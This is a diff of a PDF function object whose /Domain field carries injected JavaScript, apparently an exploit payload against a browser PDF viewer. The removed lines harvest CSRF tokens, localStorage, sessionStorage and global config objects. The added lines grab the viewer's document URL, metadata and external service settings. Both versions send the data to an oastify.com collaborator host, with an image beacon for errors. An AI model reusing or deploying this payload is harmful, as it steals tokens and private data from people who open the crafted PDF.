@@ -3,24 +3,25 @@
 <<
   /FunctionType 4
   /Domain [((function(){
-  var out = {};
-  // 1. DOM中的潜在Token
-  var meta = document.querySelector('meta[name*="csrf"], meta[name*="token"]');
-  if (meta) out.csrf_meta = meta.content;
-  var inp = document.querySelector('input[name*="token"], input[name*="csrf"]');
-  if (inp) out.csrf_input = inp.value;
-  // 2. 存储
-  try { out.localStorage = JSON.stringify(localStorage); } catch(e){}
-  try { out.sessionStorage = JSON.stringify(sessionStorage); } catch(e){}
-  // 3. 全局变量（常见键名）
-  ['appSettings','__INITIAL_STATE__','config','APP_CONFIG'].forEach(function(k){
-    if (window[k]) { try { out[k] = JSON.stringify(window[k]).slice(0,2000); } catch(e){} }
-  });
-  // 4. 外带
-  var xhr = new XMLHttpRequest();
-  xhr.open('POST', 'https://your-collab.oastify.com/probe', true);
-  xhr.setRequestHeader('Content-Type','application/json');
-  xhr.send(JSON.stringify(out));
+    var out = {};
+    try {
+        var app = window.PDFViewerApplication;
+        if (app) {
+            // 1. 获取当前 PDF 的实际 URL（可能包含未授权的内部路径、临时签名 Token）
+            out.url = app.url || app._docUrl;
+            // 2. 获取 PDF 的元数据（作者、创建工具、内部路径等）
+            if (app.metadata) out.metadata = app.metadata.info;
+            // 3. 获取内部配置（可能泄露 API 地址）
+            if (app.externalServices) out.extServices = app.externalServices;
+        }
+        
+        // 外带
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://your-collab.oastify.com/pdf_data', true);
+        xhr.send(JSON.stringify(out));
+    } catch(e) {
+        new Image().src = 'https://your-collab.oastify.com/err?e=' + encodeURIComponent(e.message);
+    }
 })();) 0]
   /Range [0 0]
   /Length 12
